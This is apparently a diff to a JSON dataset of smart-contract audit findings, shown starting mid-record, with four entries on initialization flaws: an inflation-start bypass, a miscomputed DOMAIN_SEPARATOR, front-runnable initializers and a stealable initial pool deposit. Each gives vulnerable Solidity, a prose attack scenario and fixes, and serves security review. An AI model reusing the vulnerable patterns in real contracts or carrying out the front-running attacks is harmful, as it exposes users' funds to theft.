+      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/215",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "170",
+      "slug": "m-10-holographable-tokens-can-be-reinitialized-code4rena-holograph-holograph-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Holograph",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Holograph",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Bridge"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Launchpad"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "NFT Marketplace"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "2594",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 2,
+      "protocol_id": "238",
+      "title": "[H-01] Minter.sol#startInflation() can be bypassed.",
+      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108\n\n```solidity\n    function startInflation() external override onlyGovernance {\n        require(lastEvent == 0, \"Inflation has already started.\");\n        lastEvent = block.timestamp;\n        lastInflationDecay = block.timestamp;\n    }\n```\n\nAs `lastEvent` and `lastInflationDecay` are not initialized in the `constructor()`, they will remain to the default value of `0`.\n\nHowever, the permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and used them directly.\n\nAs a result, if `executeInflationRateUpdate()` is called before `startInflation()`:\n\n1. L190, the check of if `_INFLATION_DECAY_PERIOD` has passed since `lastInflationDecay` will be `true`, and `initialPeriodEnded` will be set to `true` right away;\n2. L188, since the `lastEvent` in `totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));` is `0`, the `totalAvailableToNow` will be set to `totalAvailableToNow ≈ currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L115-L117\n\n```solidity\n    function executeInflationRateUpdate() external override returns (bool) {\n        return _executeInflationRateUpdate();\n    }\n```\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215\n\n```solidity\n    function _executeInflationRateUpdate() internal returns (bool) {\n        totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));\n        lastEvent = block.timestamp;\n        if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {\n            currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);\n            if (initialPeriodEnded) {\n                currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(\n                    annualInflationDecayKeeper\n                );\n                currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(\n                    annualInflationDecayAmm\n                );\n            } else {\n                currentInflationAmountKeeper =\n                    initialAnnualInflationRateKeeper /\n                    _INFLATION_DECAY_PERIOD;\n\n                currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;\n                initialPeriodEnded = true;\n            }\n            currentTotalInflation =\n                currentInflationAmountLp +\n                currentInflationAmountKeeper +\n                currentInflationAmountAmm;\n            controller.inflationManager().checkpointAllGauges();\n            lastInflationDecay = block.timestamp;\n        }\n        return true;\n    }\n```\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L50-L51\n\n```solidity\n    // Used for final safety check to ensure inflation is not exceeded\n    uint256 public totalAvailableToNow;\n```\n\nhttps://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L217-L227\n\n```solidity\n    function _mint(address beneficiary, uint256 amount) internal returns (bool) {\n        totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation);\n        uint256 newTotalMintedToNow = totalMintedToNow + amount;\n        require(newTotalMintedToNow <= totalAvailableToNow, \"Mintable amount exceeded\");\n        totalMintedToNow = newTotalMintedToNow;\n        lastEvent = block.timestamp;\n        token.mint(beneficiary, amount);\n        _executeInflationRateUpdate();\n        emit TokensMinted(beneficiary, amount);\n        return true;\n    }\n```\n\n### Recommendation\n\n\nConsider initializing `lastEvent`, `lastInflationDecay` in `constructor()`.\n\nor\n\nConsider adding `require(lastEvent != 0 && lastInflationDecay != 0, \"...\")` to `executeInflationRateUpdate()`.",
+      "summary": "\nThis bug report is about a vulnerability in the code of the Minter.sol contract. The vulnerability is related to the `lastEvent` and `lastInflationDecay` variables, which are not initialized in the `constructor()` and remain to the default value of `0`. \n\nThe permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and uses them directly. As a result, if `executeInflationRateUpdate()` is called before `startInflation()`, the `totalAvailableToNow` will be set to `totalAvailableToNow ≈ currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.\n\nThe recommendation to fix this vulnerability is to either initialize `lastEvent`, `lastInflationDecay` in `constructor()` or add `require(lastEvent != 0 && lastInflationDecay != 0, \"...\")` to `executeInflationRateUpdate()`.",
+      "report_date": {},
+      "contest_prize_txt": "$75,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-05-backd-tokenomics-contest",
+      "sponsor_name": "Backd",
+      "sponsor_link": "https://twitter.com/backdfund",
+      "quality_score": 5,
+      "general_score": 4,
+      "source_link": "https://code4rena.com/reports/2022-05-backd",
+      "github_link": "https://github.com/code-423n4/2022-05-backd-findings/issues/99",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "131",
+      "slug": "h-01-mintersolstartinflation-can-be-bypassed-code4rena-backd-backd-tokenomics-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Backd",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Backd",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "2507",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 6,
+      "protocol_id": "216",
+      "title": "[M-10] Wrong DOMAIN_SEPARATOR",
+      "content": "_Submitted by 0x1f8b, also found by rotcivegaf, unforgiven, CertoraInc, eccentricexit, and IllIllI_\n\nThe `DOMAIN_SEPARATOR` is wrongly calculated.\n\n### Proof of Concept\n\nIn the `initialize` method of the `BathToken` contract, the `name` of the contract is used to calculate the `DOMAIN_SEPARATOR`, however said name is set later, so it will use an incorrect `name`, making it impossible to calculate the `DOMAIN_SEPARATOR` correctly.\n\n```javascript\nDOMAIN_SEPARATOR = keccak256(\n    abi.encode(\n        keccak256(\n            \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n        ),\n        keccak256(bytes(name)),\n        keccak256(bytes(\"1\")),\n        chainId,\n        address(this)\n    )\n);\nname = string(abi.encodePacked(_symbol, (\" v1\")));\n```\n\nAffected source code:\n\n*   [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210)\n\n### Recommended Mitigation Steps\n\n*   Set the `name` before using it.\n\n**[bghughes (Rubicon) confirmed](https://github.com/code-423n4/2022-05-rubicon-findings/issues/38)**\n\n\n\n***\n\n",
+      "summary": "\nThis bug report is about the incorrect calculation of the `DOMAIN_SEPARATOR` in the `BathToken` contract. The `DOMAIN_SEPARATOR` is calculated using the `name` of the contract, however, the `name` is set later, resulting in the incorrect calculation of the `DOMAIN_SEPARATOR`. The affected source code is located at [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210). The impact of this bug is that it will make it impossible to calculate the `DOMAIN_SEPARATOR` correctly. The recommended mitigation step for this bug is to set the `name` before using it.",
+      "report_date": {},
+      "contest_prize_txt": "$50,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-05-rubicon-contest",
+      "sponsor_name": "Rubicon",
+      "sponsor_link": "https://twitter.com/rubicondefi",
+      "quality_score": 3,
+      "general_score": 5,
+      "source_link": "https://code4rena.com/reports/2022-05-rubicon",
+      "github_link": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/38",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "129",
+      "slug": "m-10-wrong-domain_separator-code4rena-rubicon-rubicon-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Rubicon",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Rubicon",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "RWA"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Domain Separator"
+          }
+        }
+      ]
+    },
+    {
+      "id": "17655",
+      "kind": "PDF",
+      "auditfirm_id": "9",
+      "impact": "HIGH",
+      "finders_count": 3,
+      "protocol_id": "779",
+      "title": "Initialization functions can be front-run",
+      "content": "## Type: Timing\n\n## Difficulty: Medium\n\n### Target: Throughout the contracts\n\n### Description\nThe `CrosslayerPortal` contracts have initializer functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Due to the use of the `delegatecall` proxy pattern, these contracts cannot be initialized with their own constructors, and they have initializer functions:\n\n```solidity\nfunction initialize() public initializer {\n    __Ownable_init();\n    __Pausable_init();\n    __ReentrancyGuard_init();\n}\n```\n\n*Figure 1.1: The `initialize` function in `MsgSender:126-130`*\n\nAn attacker could front-run these functions and initialize the contracts with malicious values. This issue affects the following system contracts:\n\n- `contracts/core/BridgeAggregator`\n- `contracts/core/InvestmentStrategyBase`\n- `contracts/core/MosaicHolding`\n- `contracts/core/MosaicVault`\n- `contracts/core/MosaicVaultConfig`\n- `contracts/core/functionCalls/MsgReceiverFactory`\n- `contracts/core/functionCalls/MsgSender`\n- `contracts/nfts/Summoner`\n- `contracts/protocols/aave/AaveInvestmentStrategy`\n- `contracts/protocols/balancer/BalancerV1Wrapper`\n- `contracts/protocols/balancer/BalancerVaultV2Wrapper`\n- `contracts/protocols/bancor/BancorWrapper`\n- `contracts/protocols/compound/CompoundInvestmentStrategy`\n- `contracts/protocols/curve/CurveWrapper`\n- `contracts/protocols/gmx/GmxWrapper`\n- `contracts/protocols/sushiswap/SushiswapLiquidityProvider`\n- `contracts/protocols/synapse/ISynapseSwap`\n- `contracts/protocols/synapse/SynapseWrapper`\n- `contracts/protocols/uniswap/IUniswapV2Pair`\n- `contracts/protocols/uniswap/UniswapV2Wrapper`\n- `contracts/protocols/uniswap/UniswapWrapper`\n\n### Exploit Scenario\nBob deploys the `MsgSender` contract. Eve front-runs the contract’s initialization and sets her own address as the owner address. As a result, she can use the `initialize` function to update the contract’s variables, modifying the system parameters.\n\n### Recommendations\n- **Short term:** To prevent front-running of the initializer functions, use `hardhat-deploy` to initialize the contracts or replace the functions with constructors. Alternatively, create a deployment script that will emit sufficient errors when an `initialize` call fails.\n  \n- **Long term:** Carefully review the Solidity documentation, especially the “Warnings” section, as well as the pitfalls of using the `delegatecall` proxy pattern.",
+      "summary": "\nThis bug report discusses a vulnerability present in several implementation contracts that allow attackers to front-run the initialization functions. This issue was found in contracts belonging to the ForceDAO and Blacksmith codebases. By front-running the initialization functions, attackers can maliciously set their own address for the _rewardPool address and receive all of the funds meant to be directed to the reward pool. \n\nShort-term solutions include using a factory pattern that will prevent front-running of the initialization or ensuring that the deployment scripts have robust protections against front-running attacks. Long-term solutions include carefully reviewing the Solidity documentation, especially the “Warnings” section, and the pitfalls of using the delegatecall proxy pattern.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchain.pdf",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchain.pdf",
+      "github_link": "",
+      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/AdvancedBlockchain.pdf",
+      "pdf_page_from": 54,
+      "contest_id": "",
+      "slug": "initialization-functions-can-be-front-run-trailofbits-advanced-blockchain-pdf",
+      "firm_name": "TrailOfBits",
+      "firm_logo_square": "trailofbits_square.png",
+      "protocol_name": "Advanced Blockchain",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "TrailOfBits",
+        "logo_square": "trailofbits_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Advanced Blockchain",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Front-Running"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        }
+      ]
+    },
+    {
+      "id": "1297",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 2,
+      "protocol_id": "313",
+      "title": "[H-04] Initial pool deposit can be stolen",
+      "content": "_Submitted by cmichel, also found by WatchPug_\n\nNote that the `PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) *from* the initial depositor (`_references[4]`):\n\n```solidity\n// PoolTemplate\nfunction initialize(\n     string calldata _metaData,\n     uint256[] calldata _conditions,\n     address[] calldata _references\n) external override {\n     // ...\n\n     if (_conditions[1] > 0) {\n          // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])\n          _depositFrom(_conditions[1], _references[4]);\n     }\n}\n\nfunction _depositFrom(uint256 _amount, address _from)\n     internal\n     returns (uint256 _mintAmount)\n{\n     require(\n          marketStatus == MarketStatus.Trading && paused == false,\n          \"ERROR: DEPOSIT_DISABLED\"\n     );\n     require(_amount > 0, \"ERROR: DEPOSIT_ZERO\");\n\n     _mintAmount = worth(_amount);\n     // @audit vault calls asset.transferFrom(_from, vault, _amount)\n     vault.addValue(_amount, _from, address(this));\n\n     emit Deposit(_from, _amount, _mintAmount);\n\n     //mint iToken\n     _mint(_from, _mintAmount);\n}\n```\n\nThe initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.\n\nAn attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market *with different parameters* but still passing in `_conditions[1]=amount` and `_references[4]=victim`.\n\nA market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.\n\n#### Recommended Mitigation Steps\n\nCan the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/250):**\n > https://github.com/code-423n4/2022-01-insure-findings/issues/224\n\n\n",
+      "summary": "\nThis bug report is about a vulnerability in the PoolTemplate.initialize function, which is called when creating a market with Factory.createMarket. This function calls a vault function to transfer an initial deposit amount from the initial depositor, but the initial depositor needs to first approve the vault contract for the transferFrom to succeed. An attacker can then frontrun the Factory.createMarket transaction with their own market creation and create a market with different parameters, but still passing in the same initial deposit amount and initial depositor. This means the initial depositor's tokens are essentially lost, as they can be used to create a market with parameters they did not want.\n\nTo mitigate this vulnerability, it is recommended that the initial depositor be set to Factory.createMarket's msg.sender, instead of being able to pick a whitelisted one as _references[4]. This would prevent the attacker from frontrunning the Factory.createMarket transaction and creating a market with different parameters.",
+      "report_date": {},
+      "contest_prize_txt": "$53,000 USDC (plus $27,000 in tokens)",
+      "contest_link": "https://code4rena.com/contests/2022-01-insuredao-contest",
+      "sponsor_name": "InsureDAO",
+      "sponsor_link": "https://twitter.com/insuredao",
+      "quality_score": 3,
+      "general_score": 4,
+      "source_link": "https://code4rena.com/reports/2022-01-insure",
+      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/250",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "71",
+      "slug": "h-04-initial-pool-deposit-can-be-stolen-code4rena-insuredao-insuredao-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "InsureDAO",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "InsureDAO",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Indexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Insurance"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Initialization"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Front-Running"
+          }
+        }
+      ]
+    }
+  ]
+}
